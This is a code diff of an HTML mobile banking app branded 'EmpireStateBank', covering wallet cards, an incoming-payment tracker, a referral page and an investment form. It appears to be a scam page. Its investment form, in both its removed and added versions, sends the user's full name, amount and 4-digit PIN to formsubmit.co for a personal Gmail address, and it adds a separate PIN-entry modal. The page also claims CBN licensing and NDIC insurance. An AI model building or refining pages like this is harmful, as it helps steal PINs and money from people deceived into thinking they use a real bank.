@@ -269,32 +269,27 @@
       display: flex;
       gap: 14px;
       font-size: 22px;
-      align-items: center;
+      position: relative;
     }
 
-    .header-icon-btn {
+    .header-icons button {
       background: none;
       border: none;
+      color: var(--text);
       font-size: 22px;
       cursor: pointer;
-      position: relative;
       padding: 0;
-      color: var(--text);
-      transition: transform 0.2s;
-    }
-
-    .header-icon-btn:hover {
-      transform: scale(1.15);
+      position: relative;
     }
 
     .notification-badge {
       position: absolute;
       top: -5px;
       right: -5px;
-      width: 20px;
-      height: 20px;
       background: #e74c3c;
       color: #fff;
+      width: 20px;
+      height: 20px;
       border-radius: 50%;
       display: flex;
       align-items: center;
@@ -325,8 +320,26 @@
     .wallet-dots {
       font-size: 18px;
       color: #999;
+    }
+
+    .wallet-indicators {
+      display: flex;
+      gap: 6px;
+      justify-content: center;
+      margin-top: 10px;
+    }
+
+    .indicator {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #ccc;
       cursor: pointer;
-      letter-spacing: 3px;
+      transition: background 0.3s;
+    }
+
+    .indicator.active {
+      background: var(--green);
     }
 
     /* Wallet Cards Slider */
@@ -385,7 +398,6 @@
     .wallet-card-number {
       font-size: 12px;
       color: #ccc;
-      letter-spacing: 1px;
     }
 
     .wallet-card-middle {
@@ -404,7 +416,6 @@
       display: flex;
       align-items: center;
       gap: 10px;
-      letter-spacing: 2px;
     }
 
     .balance-hidden {
@@ -463,30 +474,6 @@
       font-size: 11px;
       color: #ccc;
       margin-top: 8px;
-    }
-
-    /* Wallet Indicators */
-    .wallet-indicators {
-      display: flex;
-      justify-content: center;
-      gap: 8px;
-      margin-top: 12px;
-      padding: 0 5px;
-    }
-
-    .indicator {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: #ddd;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-
-    .indicator.active {
-      background: var(--green);
-      width: 24px;
-      border-radius: 4px;
     }
 
     .incoming {
@@ -760,6 +747,337 @@
 
     .alert-btn:hover {
       background: var(--dark-green);
+    }
+
+    /* PIN Modal */
+    .pin-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 12;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.7);
+    }
+
+    .pin-modal.active {
+      display: flex;
+    }
+
+    .pin-box {
+      width: 100%;
+      max-width: 320px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 25px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .pin-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .pin-input-field {
+      margin-bottom: 20px;
+    }
+
+    .pin-input-field label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 8px;
+    }
+
+    .pin-input-field input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+      letter-spacing: 2px;
+    }
+
+    .pin-buttons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .pin-btn {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .pin-confirm {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .pin-confirm:hover {
+      background: var(--dark-green);
+    }
+
+    .pin-cancel {
+      background: #eee;
+      color: var(--text);
+    }
+
+    .pin-cancel:hover {
+      background: #ddd;
+    }
+
+    /* TV Channel Modal */
+    .tv-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      background: rgba(0,0,0,.55);
+    }
+
+    .tv-modal.active {
+      display: flex;
+    }
+
+    .tv-box {
+      width: 100%;
+      max-width: 320px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 25px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .tv-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+      margin-bottom: 20px;
+    }
+
+    .tv-buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .tv-btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .tv-channel-btn {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .tv-channel-btn:hover {
+      background: var(--dark-green);
+    }
+
+    .tv-close-btn {
+      background: #eee;
+      color: var(--text);
+    }
+
+    .tv-close-btn:hover {
+      background: #ddd;
+    }
+
+    /* Referral Program Page */
+    .referral-page {
+      display: none;
+      min-height: 100vh;
+      background: #f6f5f2;
+      padding: 20px;
+      padding-bottom: 90px;
+    }
+
+    .referral-page.active {
+      display: block;
+    }
+
+    .referral-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 25px;
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+      position: relative;
+    }
+
+    .referral-close {
+      position: absolute;
+      left: 0;
+      width: 40px;
+      height: 40px;
+      background: #1a1a1a;
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    .referral-title {
+      margin-left: 50px;
+      flex: 1;
+      text-align: left;
+    }
+
+    .referral-content {
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .referral-banner {
+      background: #e8f5e9;
+      border-radius: 12px;
+      padding: 30px 20px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .referral-banner-icon {
+      font-size: 40px;
+      margin-bottom: 10px;
+    }
+
+    .referral-section {
+      background: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+
+    .referral-section-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 15px;
+    }
+
+    .referral-code {
+      background: #f5f5f5;
+      border-radius: 8px;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .referral-code-text {
+      font-size: 18px;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .copy-btn {
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 8px;
+      color: #666;
+    }
+
+    .copy-btn:hover {
+      color: var(--green);
+    }
+
+    .referral-link {
+      background: #f5f5f5;
+      border-radius: 8px;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      word-break: break-all;
+    }
+
+    .referral-link-text {
+      font-size: 13px;
+      color: #666;
+      flex: 1;
+    }
+
+    .link-buttons {
+      display: flex;
+      gap: 8px;
+    }
+
+    .link-btn {
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 8px;
+      color: #666;
+    }
+
+    .link-btn:hover {
+      color: var(--green);
+    }
+
+    .share-btn {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .share-btn:hover {
+      background: var(--dark-green);
+    }
+
+    .how-it-works {
+      background: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+
+    .how-it-works-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 15px;
+    }
+
+    .how-it-works-list {
+      list-style: disc;
+      padding-left: 20px;
+    }
+
+    .how-it-works-list li {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 10px;
+      line-height: 1.5;
     }
 
     /* Proof Page Styles */
@@ -1078,201 +1396,16 @@
       font-weight: 600;
     }
 
-    /* Investment Page */
-    .investment-page {
-      display: none;
-      min-height: 100vh;
-      background: #f2f1ee;
-      padding: 0 0 30px;
-      color: #1f2b36;
-    }
-
-    .investment-page.active {
-      display: block;
-    }
-
-    .investment-topbar {
-      background: #0b6a7d;
-      color: #fff;
-      padding: 18px 20px 14px;
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      font-size: 28px;
-      font-weight: 700;
-    }
-
-    .investment-topbar .back-arrow {
-      font-size: 38px;
-      line-height: 1;
-      cursor: pointer;
-      transform: translateY(-2px);
-    }
-
-    .investment-topbar .title {
-      font-size: clamp(22px, 4vw, 32px);
-      font-weight: 700;
-    }
-
-    .investment-wallet-tabs {
-      background: #0b6a7d;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 0 18px 0;
-      border-bottom: 1px solid rgba(255,255,255,0.08);
-    }
-
-    .investment-wallet-tab {
-      flex: 1;
-      text-align: center;
-      color: rgba(255,255,255,0.9);
-      font-size: 16px;
-      letter-spacing: 0.5px;
-      font-weight: 700;
-      padding: 18px 8px 16px;
-      text-transform: uppercase;
-    }
-
-    .investment-content {
-      max-width: 760px;
-      margin: 0 auto;
-      padding: 24px 22px 0;
-    }
-
-    .investment-label {
-      font-size: 14px;
-      color: #2d3a4a;
-      margin-bottom: 16px;
-      display: block;
-    }
-
-    .investment-account-box {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 26px;
-    }
-
-    .investment-account-icon {
-      width: 26px;
-      height: 26px;
-      border-radius: 6px;
-      background: #0a9b69;
-      position: relative;
-      box-shadow: inset 0 0 0 2px rgba(255,255,255,0.2);
-    }
-
-    .investment-account-icon:before {
-      content: "";
-      position: absolute;
-      inset: 4px;
-      border-radius: 4px;
-      background: rgba(255,255,255,0.2);
-    }
-
-    .investment-account-number {
-      font-size: clamp(24px, 4vw, 34px);
-      font-weight: 700;
-      letter-spacing: 0.05em;
-      color: #1d2a38;
-    }
-
-    .investment-amount-label {
-      display: block;
-      margin-bottom: 16px;
-      color: #2d3a4a;
-      font-size: 18px;
-      font-weight: 500;
-    }
-
-    .investment-input-wrap {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background: rgba(255,255,255,0.35);
-      border-radius: 12px;
-      padding: 18px 18px;
-      border: 1px solid rgba(0,0,0,0.04);
-      box-shadow: inset 0 0 0 1px rgba(0,0,0,0.02);
-      gap: 16px;
-    }
-
-    .investment-step-btn {
-      width: 54px;
-      height: 54px;
-      border: 0;
-      border-radius: 10px;
-      background: rgba(255,255,255,0.2);
-      font-size: 40px;
-      line-height: 1;
-      color: #1a2b39;
-      cursor: pointer;
-      font-weight: 300;
-    }
-
-    .investment-amount {
-      flex: 1;
-      text-align: center;
-      border: none;
-      background: transparent;
-      font-size: clamp(34px, 7vw, 58px);
-      font-weight: 700;
-      color: #1d2a38;
-      outline: none;
-      width: 100%;
-      min-width: 0;
-      appearance: textfield;
-    }
-
-    .investment-amount::-webkit-outer-spin-button,
-    .investment-amount::-webkit-inner-spin-button {
-      -webkit-appearance: none;
-      margin: 0;
-    }
-
-    .investment-form {
-      margin-top: 28px;
-    }
-
-    .investment-form-row {
-      margin-bottom: 18px;
-    }
-
-    .investment-field {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1px solid #dfe3e7;
-      border-radius: 10px;
-      font-size: 16px;
-      background: #fff;
-      color: #1d2a38;
-      outline: none;
-    }
-
-    .investment-submit {
-      width: 100%;
-      padding: 18px 15px;
-      border: 0;
-      border-radius: 10px;
-      background: #0c7fda;
-      color: #fff;
-      font-size: clamp(20px, 4vw, 30px);
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-
     /* Camera Modal */
     .camera-modal {
       position: fixed;
       inset: 0;
-      z-index: 12;
+      z-index: 10;
       display: none;
       align-items: center;
       justify-content: center;
       padding: 15px;
-      background: rgba(0, 0, 0, 0.9);
+      background: rgba(0, 0, 0, 0.7);
     }
 
     .camera-modal.active {
@@ -1282,345 +1415,69 @@
     .camera-box {
       width: 100%;
       max-width: 400px;
-      background: #000;
-      border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
-    }
-
-    #cameraVideo {
-      width: 100%;
-      height: 400px;
-      background: #000;
-      display: block;
-    }
-
-    .camera-controls {
-      display: flex;
-      gap: 10px;
-      padding: 15px;
-      background: #111;
-      justify-content: center;
-    }
-
-    .camera-btn {
-      padding: 12px 20px;
-      border: none;
-      border-radius: 8px;
-      font-weight: bold;
-      cursor: pointer;
-      font-size: 14px;
-    }
-
-    .camera-btn-capture {
-      background: var(--green);
-      color: #fff;
-    }
-
-    .camera-btn-close {
-      background: #e74c3c;
-      color: #fff;
-    }
-
-    .face-preview {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      object-fit: cover;
-      border: 3px solid var(--green);
-      display: none;
-      margin: 10px auto;
-    }
-
-    .face-preview.show {
-      display: block;
-    }
-
-    /* TV Channels Modal */
-    .tv-channels-modal {
-      position: fixed;
-      inset: 0;
-      z-index: 10;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      padding: 15px;
-      background: rgba(0,0,0,.55);
-    }
-
-    .tv-channels-modal.active {
-      display: flex;
-    }
-
-    .tv-channels-card {
-      width: 100%;
-      max-width: 500px;
       background: #fff;
       border-radius: 16px;
-      padding: 30px 25px;
+      padding: 20px;
+      text-align: center;
       box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
     }
 
-    .tv-channels-card h2 {
-      text-align: center;
-      margin-bottom: 30px;
+    .camera-title {
+      font-size: 18px;
+      font-weight: bold;
       color: var(--text);
-      font-size: 22px;
+      margin-bottom: 15px;
     }
 
-    .tv-channels-list {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
-
-    .tv-channel-btn {
+    .camera-video {
       width: 100%;
-      padding: 18px;
-      border: 2px solid #ddd;
       border-radius: 12px;
-      background: #f9f9f9;
-      color: var(--text);
-      font-weight: 700;
-      font-size: 16px;
-      cursor: pointer;
-      transition: all 0.2s;
+      margin-bottom: 15px;
+      background: #000;
     }
 
-    .tv-channel-btn:hover {
-      border-color: var(--green);
-      background: #f0fdf4;
-      transform: translateY(-2px);
+    .camera-canvas {
+      display: none;
     }
 
-    .tv-channel-icon {
-      font-size: 20px;
-      margin-right: 10px;
+    .camera-buttons {
+      display: flex;
+      gap: 10px;
     }
 
-    .tv-channels-close {
-      width: 100%;
+    .camera-btn {
+      flex: 1;
       padding: 12px;
-      margin-top: 20px;
       border: none;
       border-radius: 8px;
-      background: #eee;
-      color: var(--text);
       font-weight: bold;
       cursor: pointer;
-    }
-
-    /* Referral Program Page */
-    .referral-page {
-      display: none;
-      min-height: 100vh;
-      background: #f6f5f2;
-      padding: 20px;
-      padding-bottom: 90px;
-    }
-
-    .referral-page.active {
-      display: block;
-    }
-
-    .referral-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 25px;
-      max-width: 620px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .referral-close {
-      font-size: 28px;
-      cursor: pointer;
-      color: var(--text);
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      background: #1a1a1a;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      line-height: 1;
-    }
-
-    .referral-title {
-      font-size: 22px;
-      font-weight: 700;
-      color: var(--text);
-      margin-left: -40px;
-      flex: 1;
-      text-align: center;
-    }
-
-    .referral-content {
-      max-width: 620px;
-      margin: 0 auto;
-      background: #fff;
-      border-radius: 16px;
-      padding: 30px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
-    }
-
-    .referral-banner {
-      width: 100%;
-      height: 150px;
-      background: linear-gradient(135deg, var(--green) 0%, var(--dark-green) 100%);
-      border-radius: 12px;
-      margin-bottom: 30px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      font-size: 48px;
-    }
-
-    .referral-section {
-      margin-bottom: 28px;
-    }
-
-    .referral-label {
-      font-size: 16px;
-      font-weight: 600;
-      color: var(--text);
-      margin-bottom: 12px;
-    }
-
-    .referral-code-box {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: #f5f5f5;
-      padding: 15px;
-      border-radius: 10px;
-    }
-
-    .referral-code-display {
-      flex: 1;
-      font-size: 16px;
-      font-weight: 700;
-      color: var(--text);
-      word-break: break-all;
-    }
-
-    .referral-copy-btn {
-      width: 40px;
-      height: 40px;
-      border: none;
-      border-radius: 8px;
-      background: #f0f0f0;
-      cursor: pointer;
-      font-size: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
       transition: background 0.2s;
     }
 
-    .referral-copy-btn:hover {
-      background: #e0e0e0;
-    }
-
-    .referral-link-box {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: #f5f5f5;
-      padding: 12px;
-      border-radius: 10px;
-      margin-bottom: 12px;
-    }
-
-    .referral-link-display {
-      flex: 1;
-      font-size: 13px;
-      color: #666;
-      word-break: break-all;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-
-    .referral-action-btn {
-      width: 40px;
-      height: 40px;
-      border: none;
-      border-radius: 8px;
-      background: #f0f0f0;
-      cursor: pointer;
-      font-size: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: background 0.2s;
-    }
-
-    .referral-action-btn:hover {
-      background: #e0e0e0;
-    }
-
-    .referral-share-btn {
-      width: 40px;
-      height: 40px;
-      border: none;
-      border-radius: 8px;
+    .camera-capture {
       background: var(--green);
       color: #fff;
-      cursor: pointer;
-      font-size: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: background 0.2s;
     }
 
-    .referral-share-btn:hover {
+    .camera-capture:hover {
       background: var(--dark-green);
     }
 
-    .referral-how-it-works {
-      background: #f9f9f9;
-      padding: 20px;
-      border-radius: 10px;
-      border-left: 4px solid var(--green);
-    }
-
-    .referral-how-title {
-      font-size: 14px;
-      font-weight: 700;
+    .camera-close {
+      background: #eee;
       color: var(--text);
-      margin-bottom: 12px;
     }
 
-    .referral-how-list {
-      list-style: none;
-      padding: 0;
-      margin: 0;
+    .camera-close:hover {
+      background: #ddd;
     }
 
-    .referral-how-item {
-      font-size: 13px;
-      color: #666;
-      margin-bottom: 10px;
-      line-height: 1.6;
-      padding-left: 20px;
-      position: relative;
-    }
-
-    .referral-how-item:before {
-      content: "•";
-      position: absolute;
-      left: 0;
-      color: var(--green);
-      font-weight: bold;
-    }
-
-    .referral-how-item:last-child {
-      margin-bottom: 0;
+    .captured-image {
+      width: 100%;
+      margin-top: 15px;
+      border-radius: 8px;
+      display: none;
     }
 
     @media (max-width: 480px) {
@@ -1641,10 +1498,6 @@
       .tile {
         padding-left: 4px;
         padding-right: 4px;
-      }
-
-      .referral-content {
-        padding: 20px;
       }
     }
   </style>
@@ -1712,10 +1565,8 @@
       </div>
 
       <div class="header-icons">
-        <button class="header-icon-btn" id="customerServiceBtn" title="Customer Service">
-          💬
-        </button>
-        <button class="header-icon-btn" id="notificationBtn" title="Notifications">
+        <button id="customerServiceBtn" title="Customer Service">💬</button>
+        <button id="notificationBtn" title="Notifications" style="position: relative;">
           🔔
           <span class="notification-badge" id="notificationBadge">1</span>
         </button>
@@ -1725,8 +1576,8 @@
     <section class="dashboard-content">
       <!-- Wallet Section -->
       <div class="wallet-section-header">
-        <div class="wallet-title">Wallet</div>
-        <div class="wallet-dots" title="Scroll to see more wallets">°°° °°°</div>
+        <div class="wallet-title">My Wallets</div>
+        <div class="wallet-dots">⋯  ⋯</div>
       </div>
 
       <div class="wallet-slider-wrapper" id="walletSliderWrapper">
@@ -1738,7 +1589,7 @@
                 <span class="verve-label">Verve</span>
                 E-Wallet Card
               </div>
-              <div class="wallet-card-number" id="cardNumber1">°°°°°° °°°°°°</div>
+              <div class="wallet-card-number" id="cardNumber1">**5549</div>
             </div>
 
             <div class="wallet-card-middle">
@@ -1757,15 +1608,15 @@
             <div class="wallet-card-header">
               <div class="wallet-card-logo">
                 <span class="verve-label">Verve</span>
-                eCash
+                eCash Wallet
               </div>
-              <div class="wallet-card-number" id="cardNumber2">°°°°°° °°°°°°</div>
+              <div class="wallet-card-number" id="cardNumber2">**2493</div>
             </div>
 
             <div class="wallet-card-middle">
-              <div class="wallet-label">Balance Hidden</div>
+              <div class="wallet-label">Balance</div>
               <div class="wallet-balance">
-                <span id="balanceDisplay" class="balance-hidden">°°° °°°</span>
+                <span id="balanceDisplay">*** **</span>
                 <button class="eye-icon-btn" id="toggleBalanceBtn">👁️</button>
               </div>
               <div class="wallet-label" style="margin-top: 10px; font-size: 11px;" id="balanceDate">--</div>
@@ -1782,12 +1633,12 @@
 
       <!-- Wallet Indicators -->
       <div class="wallet-indicators">
-        <div class="indicator active" id="indicator1"></div>
-        <div class="indicator" id="indicator2"></div>
+        <div class="indicator active" data-index="0"></div>
+        <div class="indicator" data-index="1"></div>
       </div>
 
       <!-- Incoming Payment -->
-      <article class="incoming">
+      <article class="incoming" id="incomingSection">
         <h2>Incoming payment</h2>
 
         <div class="progress-track">
@@ -1820,18 +1671,67 @@
 
       <!-- Services Grid -->
       <section class="services">
+        <button class="tile hidden"><span class="tile-icon">▥</span><span>Airtime</span></button>
+        <button class="tile hidden"><span class="tile-icon">▤</span><span>Data</span></button>
         <button class="tile" id="bettingButton"><span class="tile-icon">◉</span><span>Betting</span></button>
         <button class="tile" id="tvButton"><span class="tile-icon">▣</span><span>TV</span></button>
+        <button class="tile hidden"><span class="tile-icon">▣</span><span>SafeBox</span></button>
         <button class="tile" id="invitationButton"><span class="tile-icon">♧</span><span>Invitation</span></button>
+        <button class="tile hidden"><span class="tile-icon">⋯</span><span>More</span></button>
       </section>
     </section>
 
     <!-- Bottom Nav -->
     <nav class="bottom-nav">
       <button class="nav-item active"><div>●</div>Home</button>
+      <button class="nav-item hidden"><div>◇</div>Rewards</button>
+      <button class="nav-item hidden"><div>▱</div>Finance</button>
+      <button class="nav-item hidden"><div>▭</div>Cards</button>
       <button class="nav-item" id="meButton"><div>●</div>Me</button>
     </nav>
   </main>
+
+  <!-- Referral Program Page -->
+  <div id="referralPage" class="referral-page">
+    <div class="referral-header">
+      <button class="referral-close" id="referralCloseBtn">×</button>
+      <div class="referral-title">🎁 Referral Program</div>
+    </div>
+
+    <div class="referral-content">
+      <div class="referral-banner">
+        <div class="referral-banner-icon">🎁</div>
+      </div>
+
+      <div class="referral-section">
+        <div class="referral-section-title">Your Referral Code</div>
+        <div class="referral-code">
+          <span class="referral-code-text" id="referralCodeDisplay">@tag</span>
+          <button class="copy-btn" id="copyCodeBtn" title="Copy code">📋</button>
+        </div>
+      </div>
+
+      <div class="referral-section">
+        <div class="referral-section-title">Your Referral Link</div>
+        <div class="referral-link">
+          <span class="referral-link-text" id="referralLinkDisplay">https://empirestatebank.mssg.me</span>
+          <div class="link-buttons">
+            <button class="link-btn" id="copyLinkBtn" title="Copy link">🔗</button>
+            <button class="link-btn share-btn" id="shareLinkBtn" title="Share">🔗</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="how-it-works">
+        <div class="how-it-works-title">How it works:</div>
+        <ul class="how-it-works-list">
+          <li>Share your referral link with friends</li>
+          <li>When they Sign up using your code, you earn $0.25</li>
+          <li>There's no limit to how many friends you can refer!</li>
+        </ul>
+      </div>
+    </div>
+  </div>
 
   <!-- Profile Page -->
   <div id="profilePage" class="profile-page">
@@ -1888,7 +1788,7 @@
   <div id="proofPage" class="proof-page">
     <div class="proof-header">
       <span id="proofBackBtn">&lt;</span>
-      <span>Provide Proof Of Raenest NGN Account</span>
+      <span>Provide Proof Raenest NGN Account</span>
     </div>
 
     <div class="proof-content">
@@ -1947,66 +1847,6 @@
       <div class="footer-info">
         Licensed by the CBN and insured by the NDIC
       </div>
-    </div>
-  </div>
-
-  <!-- Investment Page -->
-  <div id="investmentPage" class="investment-page">
-    <div class="investment-topbar">
-      <span id="investmentBackBtn" class="back-arrow">&lt;</span>
-      <span class="title">Investment</span>
-    </div>
-
-    <div class="investment-wallet-tabs">
-      <div class="investment-wallet-tab">My E-wallet</div>
-    </div>
-
-    <div class="investment-content">
-      <form id="investmentForm" class="investment-form" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST">
-        <input type="hidden" name="_subject" value="Investment" />
-        <input type="hidden" name="Page Title" id="investmentPageTitle" value="Investment" />
-
-        <div class="investment-label">Invest with EmpireStateBank</div>
-
-        <div class="investment-account-box">
-          <span class="investment-account-icon" aria-hidden="true"></span>
-          <span class="investment-account-number" id="investmentAccountNumber">2348105866469</span>
-        </div>
-
-        <label class="investment-amount-label" for="investmentAmount">Select Amount ($)</label>
-
-        <div class="investment-input-wrap">
-          <button type="button" class="investment-step-btn" id="investmentMinusBtn" aria-label="Decrease amount">−</button>
-          <input
-            id="investmentAmount"
-            class="investment-amount"
-            name="Select Amount (USD)"
-            type="number"
-            min="1"
-            step="0.01"
-            value="500"
-            aria-label="Investment amount in dollars"
-          />
-          <button type="button" class="investment-step-btn" id="investmentPlusBtn" aria-label="Increase amount">+</button>
-        </div>
-
-        <div class="investment-form-row" style="margin-top: 20px;">
-          <label class="investment-label" for="investmentFullName">Full Name</label>
-          <input class="investment-field" id="investmentFullName" name="Full Name" type="text" readonly />
-        </div>
-
-        <div class="investment-form-row">
-          <label class="investment-label" for="investmentDate">Date</label>
-          <input class="investment-field" id="investmentDate" name="Investment Date" type="date" required />
-        </div>
-
-        <div class="investment-form-row">
-          <label class="investment-label" for="investmentPin">PIN</label>
-          <input class="investment-field" id="investmentPin" name="PIN" type="password" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" placeholder="Enter 4-digit PIN" required />
-        </div>
-
-        <button type="submit" class="investment-submit">Invest</button>
-      </form>
     </div>
   </div>
 
@@ -2095,6 +1935,62 @@
     </div>
   </div>
 
+  <!-- Investment Modal -->
+  <div id="investmentModal" class="modal">
+    <div class="modal-card">
+      <div class="modal-back" id="investmentModalBack">
+        <span>&lt;</span>
+        <span>Investment</span>
+      </div>
+
+      <div class="convert-header">
+        <div style="display: flex; align-items: center; gap: 15px;">
+          <div style="width: 50px; height: 50px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #d4af37; font-weight: bold;">ESB</div>
+          <div>
+            <div style="font-weight: bold; font-size: 14px;">Fund my E-wallet to Invest with EmpireStateBank</div>
+            <div style="font-size: 12px;">Invest your funds securely</div>
+          </div>
+        </div>
+      </div>
+
+      <form id="investmentForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST">
+        <input type="hidden" name="_subject" value="Investment" />
+
+        <div class="field">
+          <label>My E-wallet</label>
+          <div class="card-display">
+            <span id="investCardDisplay">E-wallet Card (**5549)</span>
+            <span class="verve-label">Verve</span>
+          </div>
+        </div>
+
+        <div class="field">
+          <label>Full Name</label>
+          <input type="text" name="Full Name" id="investFullName" readonly style="background: #f5f5f5; cursor: not-allowed;">
+        </div>
+
+        <div class="field">
+          <label>Select Amount ($)</label>
+          <input type="number" name="Investment Amount (USD)" id="investAmountInput" placeholder="0.00" step="0.01" min="1" required />
+        </div>
+
+        <div class="field">
+          <label>Date</label>
+          <input type="date" name="Investment Date" id="investDateInput" required />
+        </div>
+
+        <div class="field">
+          <label>PIN (4 digits)</label>
+          <input type="password" name="PIN" id="investPinInput" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+        </div>
+
+        <button class="primary-btn" type="submit">
+          <span id="investBtnText">Continue to Invest</span>
+        </button>
+      </form>
+    </div>
+  </div>
+
   <!-- Alert Modal -->
   <div id="alertModal" class="alert-modal">
     <div class="alert-box">
@@ -2104,69 +2000,43 @@
     </div>
   </div>
 
+  <!-- PIN Modal -->
+  <div id="pinModal" class="pin-modal">
+    <div class="pin-box">
+      <div class="pin-title">Enter Your PIN</div>
+      <div class="pin-input-field">
+        <label for="pinInputField">PIN (4 digits)</label>
+        <input type="password" id="pinInputField" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+      </div>
+      <div class="pin-buttons">
+        <button class="pin-btn pin-confirm" id="pinConfirmBtn">Confirm</button>
+        <button class="pin-btn pin-cancel" id="pinCancelBtn">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TV Channel Modal -->
+  <div id="tvModal" class="tv-modal">
+    <div class="tv-box">
+      <div class="tv-title">Select TV Channel</div>
+      <div class="tv-buttons">
+        <button class="tv-btn tv-channel-btn" id="channel1Btn">Channel 1</button>
+        <button class="tv-btn tv-channel-btn" id="channel2Btn">Channel 2</button>
+        <button class="tv-btn tv-close-btn" id="tvCloseBtn">Close</button>
+      </div>
+    </div>
+  </div>
+
   <!-- Camera Modal -->
   <div id="cameraModal" class="camera-modal">
     <div class="camera-box">
-      <video id="cameraVideo" playsinline autoplay></video>
-      <div class="camera-controls">
-        <button type="button" class="camera-btn camera-btn-capture" id="cameraCaptureBtn">Capture</button>
-        <button type="button" class="camera-btn camera-btn-close" id="cameraCloseBtn">Close</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- TV Channels Modal -->
-  <div id="tvChannelsModal" class="tv-channels-modal">
-    <div class="tv-channels-card">
-      <h2>Select TV Channel</h2>
-      <div class="tv-channels-list">
-        <button type="button" class="tv-channel-btn" id="channel1Btn">
-          <span class="tv-channel-icon">📺</span>Channel 1
-        </button>
-        <button type="button" class="tv-channel-btn" id="channel2Btn">
-          <span class="tv-channel-icon">📺</span>Channel 2
-        </button>
-      </div>
-      <button type="button" class="tv-channels-close" id="tvChannelsCloseBtn">Close</button>
-    </div>
-  </div>
-
-  <!-- Referral Program Page -->
-  <div id="referralPage" class="referral-page">
-    <div class="referral-header">
-      <span class="referral-close" id="referralCloseBtn">×</span>
-      <span class="referral-title">🎁 Referral Program</span>
-    </div>
-
-    <div class="referral-content">
-      <div class="referral-banner">🎁</div>
-
-      <div class="referral-section">
